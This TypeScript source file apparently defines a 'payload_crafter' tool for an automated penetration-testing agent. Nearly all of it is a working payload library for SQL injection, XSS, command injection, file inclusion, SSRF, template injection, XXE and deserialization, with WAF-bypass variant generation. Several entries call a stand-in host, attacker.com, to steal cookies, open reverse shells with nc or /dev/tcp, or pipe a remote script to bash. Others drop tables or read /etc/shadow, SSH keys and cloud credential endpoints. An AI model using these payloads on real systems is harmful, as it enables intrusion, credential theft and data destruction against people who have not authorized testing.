import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'payload_crafter',
  description: 'Generates targeted attack payloads with WAF-bypass variants for authorized penetration testing',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'vuln_type', type: 'string', required: true, description: 'sqli|xss|cmdi|lfi|ssrf|ssti|xxe|deserialization' },
    { name: 'tech_stack', type: 'string', required: false, description: 'php|java|python|dotnet|node|ruby', default: 'php' },
    { name: 'context', type: 'string', required: false, description: 'get_param|post_body|header|cookie|json_value', default: 'get_param' },
    { name: 'encoding', type: 'string', required: false, description: 'none|url|base64|html', default: 'none' },
  ],
};

const PAYLOAD_LIBRARY: Record<string, Record<string, string[]>> = {
  sqli: {
    base: [
      "' OR '1'='1",
      "' OR 1=1--",
      "' OR 1=1#",
      "'; DROP TABLE users--",
      "1' AND SLEEP(5)--",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT username,password,NULL FROM users--",
      "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
      "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
      "'; EXEC xp_cmdshell('whoami')--",
      "1 OR 1=1",
      "admin'--",
      "' OR 'x'='x",
      "\" OR \"\"=\"",
    ],
    php:    ["' OR SLEEP(5)#", "1'; SELECT LOAD_FILE('/etc/passwd')#"],
    java:   ["' OR '1'='1' {fn sleep(5)}--", "1 AND 1=CAST((SELECT @@version) AS INT)--"],
    python: ["' OR pg_sleep(5)--", "1 UNION SELECT null,version(),null--"],
    dotnet: ["1' WAITFOR DELAY '0:0:5'--", "' OR 1=1; SELECT * FROM sysobjects--"],
    node:   ["' OR true--", "1 OR '1'='1"],
    ruby:   ["' OR 1=1 LIMIT 1--", "1'; SELECT pg_sleep(5)--"],
  },
  xss: {
    base: [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "javascript:alert(1)",
      "'><script>alert(document.cookie)</script>",
      "<body onload=alert(1)>",
      "<iframe src=javascript:alert(1)>",
      "<input autofocus onfocus=alert(1)>",
      "<details open ontoggle=alert(1)>",
      "<video><source onerror=alert(1)>",
      "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
      "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
      "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
      "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
      "<object data='javascript:alert(1)'>",
    ],
    php:    ["<script>alert(document.domain)</script>", "<?php echo '<script>alert(1)</script>'; ?>"],
    java:   ["<script>alert(document.cookie)</script>"],
    python: ["{{7*7}}", "{{config}}", "{%import os%}{{os.popen('id').read()}}"],
    dotnet: ["<script>alert(1)</script>"],
    node:   ["<script>alert(process.env)</script>"],
    ruby:   ["<%= 7*7 %>", "<%= system('id') %>"],
  },
  cmdi: {
    base: [
      "; id",
      "| id",
      "& id",
      "`id`",
      "$(id)",
      "; cat /etc/passwd",
      "| cat /etc/shadow",
      "&& whoami",
      "; ls -la /",
      "| nc -e /bin/sh attacker.com 4444",
      "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
      "$(curl http://attacker.com/shell.sh | bash)",
      "\n/usr/bin/id",
      "1; sleep 5",
      "| sleep 5",
    ],
    php:    ["; php -r 'system(\"id\");'", "| php -r 'echo shell_exec(\"id\");'"],
    java:   ["; java -version", "| javac --version"],
    python: ["; python3 -c 'import os;os.system(\"id\")'"],
    dotnet: ["; powershell -c whoami", "| cmd /c whoami"],
    node:   ["; node -e 'require(\"child_process\").exec(\"id\",console.log)'"],
    ruby:   ["; ruby -e 'puts `id`'"],
  },
  lfi: {
    base: [
      "../../../../etc/passwd",
      "../../../../etc/shadow",
      "../../../../proc/self/environ",
      "../../../../var/log/apache2/access.log",
      "../../../../var/log/nginx/access.log",
      "../../../../home/user/.ssh/id_rsa",
      "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
      "....//....//....//....//etc/passwd",
      "php://filter/convert.base64-encode/resource=/etc/passwd",
      "php://input",
      "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
      "expect://id",
      "/proc/self/fd/0",
      "../../../../windows/system32/drivers/etc/hosts",
      "../../../../windows/win.ini",
    ],
    php:    ["php://filter/read=convert.base64-encode/resource=index.php"],
    java:   ["WEB-INF/web.xml", "WEB-INF/classes/com/example/Passwords.class"],
    python: ["/proc/self/cmdline", "/proc/1/cmdline"],
    dotnet: ["C:\\Windows\\System32\\drivers\\etc\\hosts", "..\\..\\..\\web.config"],
    node:   ["/proc/self/environ", "../../../../etc/passwd"],
    ruby:   ["/etc/passwd", "../../../../config/database.yml"],
  },
  ssrf: {
    base: [
      "http://169.254.169.254/latest/meta-data/",
      "http://169.254.169.254/latest/user-data/",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://100.100.100.200/latest/meta-data/",
      "http://localhost/admin",
      "http://127.0.0.1:22",
      "http://127.0.0.1:6379",
      "http://127.0.0.1:27017",
      "http://0.0.0.0:8080/admin",
      "file:///etc/passwd",
      "dict://localhost:11211/",
      "gopher://localhost:6379/_INFO",
      "http://[::1]/admin",
      "http://2130706433/",
      "http://0177.0.0.1/admin",
    ],
    php:    ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
    java:   ["jar:http://attacker.com/evil.jar!/"],
    python: ["http://instance-data/latest/meta-data/"],
    dotnet: [],
    node:   ["http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"],
    ruby:   ["http://169.254.169.254/latest/meta-data/"],
  },
  ssti: {
    base: [
      "{{7*7}}",
      "{{7*'7'}}",
      "${7*7}",
      "#{7*7}",
      "<%= 7*7 %>",
      "{{config}}",
      "{{self.__class__.__mro__}}",
      "{{''.__class__.__mro__[2].__subclasses__()}}",
      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
      "{%import os%}{{os.popen('id').read()}}",
      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
      "${{7*7}}",
      "{{7*7}}#{7*7}${7*7}",
      "@(7*7)",
      "`7*7`",
    ],
    php:    ["{{_self.env.setCache(\"ftp://attacker.com\")}}{{_self}}"],
    java:   ["${\"freemarker.template.utility.Execute\"?new()(\"id\")}"],
    python: ["{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"],
    dotnet: ["@{7*7}", "@System.Diagnostics.Process.Start(\"calc.exe\")"],
    node:   ["{{7*7}}", "<%=7*7%>"],
    ruby:   ["<%= 7*7 %>", "<%= system('id') %>"],
  },
  xxe: {
    base: [
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>",
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo></foo>",
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/hostname'>]><root>&test;</root>",
    ],
    php:    [],
    java:   ["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"],
    python: [],
    dotnet: [],
    node:   [],
    ruby:   [],
  },
  deserialization: {
    base: [
      "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlcg==",
      "aced0005sr0024sun.reflect.annotation.AnnotationInvocationHandler",
      "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com:1389/Exploit\",\"autoCommit\":true}",
      "O:8:\"stdClass\":0:{}",
      "a:2:{i:0;s:4:\"test\";i:1;s:4:\"data\";}",
      "O:4:\"User\":1:{s:8:\"username\";s:5:\"admin\";}",
    ],
    php:    ["O:8:\"stdClass\":1:{s:4:\"exec\";s:2:\"id\";}", "a:1:{i:0;O:8:\"stdClass\":1:{s:4:\"exec\";s:2:\"id\";}}"],
    java:   ["rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7"],
    python: ["gASVKAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbISTlCmFlFKULg=="],
    dotnet: ["AAEAAAD/////AQAAAAAAAAAMAgAAAFJTeXN0ZW0="],
    node:   [],
    ruby:   ["BAhbB2kGSSIJaWQG\n6AMAAAAA"],
  },
};

const MITRE_MAP: Record<string, string> = {
  sqli:            'T1190',
  xss:             'T1059.007',
  cmdi:            'T1059',
  lfi:             'T1083',
  ssrf:            'T1090',
  ssti:            'T1190',
  xxe:             'T1190',
  deserialization: 'T1190',
};

function encodePayload(payload: string, encoding: string): string {
  switch (encoding) {
    case 'url':
      return encodeURIComponent(payload);
    case 'base64':
      return Buffer.from(payload).toString('base64');
    case 'html':
      return payload
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
    default:
      return payload;
  }
}

function buildWafVariants(payloads: string[], vulnType: string): string[] {
  const variants: string[] = [];
  const sample = payloads.slice(0, 5);

  for (const p of sample) {
    // Case variation
    if (vulnType === 'sqli') {
      variants.push(p.replace(/select/gi, 'SeLeCt').replace(/union/gi, 'UnIoN'));
      // Comment injection
      variants.push(p.replace(/ /g, '/**/'));
      // URL double-encoding
      variants.push(encodeURIComponent(encodeURIComponent(p)));
    }
    if (vulnType === 'xss') {
      // Null byte injection
      variants.push(p.replace('<', '<\x00'));
      // Tab/newline injection
      variants.push(p.replace('script', 'scr\tipt'));
      // HTML entities
      variants.push(p.replace('<script>', '&#60;script&#62;'));
    }
    if (vulnType === 'cmdi') {
      // IFS bypass
      variants.push(p.replace(/ /g, '${IFS}'));
      // Backtick variant
      variants.push(p.replace('id', '`id`'));
    }
  }

  return [...new Set(variants)];
}

function getDetectionNotes(vulnType: string): string {
  const notes: Record<string, string> = {
    sqli: 'Success indicators: SQL error messages (syntax error, mysql_fetch), response time delays (>5s for blind), different content length for boolean payloads, data returned in response',
    xss: 'Success indicators: alert/prompt dialog appears, onerror fires (check network tab), reflected payload in source, DOM mutation in browser console',
    cmdi: 'Success indicators: OS output in response (uid=, root:), response delay for sleep payloads, callback to attacker-controlled listener',
    lfi: 'Success indicators: /etc/passwd content (root:x:0:0:), Windows INI content, base64-encoded file content, PHP source code',
    ssrf: 'Success indicators: AWS metadata response (ami-id, instance-id), internal service banners, different response for 127.0.0.1 vs external IPs',
    ssti: 'Success indicators: arithmetic result (49 for 7*7), config object dump, OS command output, error revealing template engine version',
    xxe: 'Success indicators: file contents in XML response, error messages referencing file paths, out-of-band DNS/HTTP callback',
    deserialization: 'Success indicators: RCE via OS callback, exception with gadget chain class names, modified object state in response',
  };
  return notes[vulnType] || 'Monitor for unexpected output, errors, or behavioral changes';
}

async function execute(
  params: Record<string, unknown>,
  _exec: CommandExecutor
): Promise<ToolResult> {
  const startTime = Date.now();
  const vulnType = String(params['vuln_type'] || '').toLowerCase();
  const techStack = String(params['tech_stack'] || 'php').toLowerCase();
  const _context = String(params['context'] || 'get_param').toLowerCase();
  const encoding = String(params['encoding'] || 'none').toLowerCase();

  const validTypes = ['sqli', 'xss', 'cmdi', 'lfi', 'ssrf', 'ssti', 'xxe', 'deserialization'];
  if (!validTypes.includes(vulnType)) {
    return {
      success: false,
      tool: 'payload_crafter',
      output: `Invalid vuln_type '${vulnType}'. Valid: ${validTypes.join('|')}`,
      parsed: {},
      duration: (Date.now() - startTime) / 1000,
      command: `payload_crafter --vuln_type ${vulnType}`,
      error: 'Invalid parameter',
    };
  }

  const lib = PAYLOAD_LIBRARY[vulnType];
  const basePayloads = [...lib['base']];
  const stackSpecific: string[] = lib[techStack] ?? [];
  const allPayloads = [...new Set([...stackSpecific, ...basePayloads])];

  const encodedPayloads = allPayloads.map(p => encodePayload(p, encoding));
  const wafVariants = buildWafVariants(allPayloads, vulnType).map(p => encodePayload(p, encoding));
  const detectionNotes = getDetectionNotes(vulnType);
  const mitreTechnique = MITRE_MAP[vulnType] || 'T1190';

  const parsed = {
    payloads: encodedPayloads,
    waf_bypass_variants: wafVariants,
    detection_notes: detectionNotes,
    mitre_technique: mitreTechnique,
    vuln_type: vulnType,
    tech_stack: techStack,
    encoding: encoding,
    payload_count: encodedPayloads.length,
    variant_count: wafVariants.length,
  };

  const output = [
    `=== Payload Crafter: ${vulnType.toUpperCase()} / ${techStack} ===`,
    `Encoding: ${encoding} | MITRE: ${mitreTechnique}`,
    '',
    `--- Payloads (${encodedPayloads.length}) ---`,
    ...encodedPayloads.map((p, i) => `[${i + 1}] ${p}`),
    '',
    `--- WAF Bypass Variants (${wafVariants.length}) ---`,
    ...wafVariants.map((p, i) => `[${i + 1}] ${p}`),
    '',
    `--- Detection Notes ---`,
    detectionNotes,
  ].join('\n');

  return {
    success: true,
    tool: 'payload_crafter',
    output,
    parsed: parsed as unknown as Record<string, unknown>,
    duration: (Date.now() - startTime) / 1000,
    command: `payload_crafter --vuln_type ${vulnType} --tech_stack ${techStack} --encoding ${encoding}`,
    error: null,
  };
}

export const payloadCrafterTool = { definition, execute };
